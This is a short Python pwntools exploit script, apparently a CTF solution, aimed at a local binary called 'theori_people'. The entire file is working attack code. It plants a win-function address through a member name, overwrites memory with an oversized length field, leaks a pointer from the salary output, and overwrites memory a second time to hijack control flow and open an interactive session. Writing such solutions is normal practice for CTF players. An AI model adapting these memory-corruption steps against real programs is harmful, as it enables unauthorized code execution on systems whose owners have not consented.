from pwn import *

s = process("./theori_people")
ELF("theori_people")

bss_member = 0x603480
iswin = 0x401139

def add_member(name):
	s.sendline("1")
	s.recvuntil(":")
	s.sendline(name)
	s.recvuntil("#")

def fire_mem(content,num,length):
	s.sendline("2")
	s.recvuntil(">")
	s.sendline(num)
	s.recvuntil("?\n")
	s.sendline("Yes")
	s.recvuntil("?")
	s.sendline(length)
	s.sendline(content)

s.recvuntil("#")
add_member("A"*8)
add_member(p64(iswin))
add_member("C"*8)
add_member("D"*8)


fire_mem(p64(bss_member+8),"2","16")


s.recvuntil("#")
s.sendline("2")
print s.recvuntil("salary")
print s.recvuntil("salary : ")
print s.recvuntil("salary : ")
leak = s.recvuntil("\n")
leak = leak[0:-1]
leak = int(leak)
print hex(leak)
s.sendline("5")
print s.recvuntil("#")
fire_mem(p64(leak+56),"1","16")
s.recvuntil("#")
s.interactive()
#s.recvuntil("#")
#s.interactive()
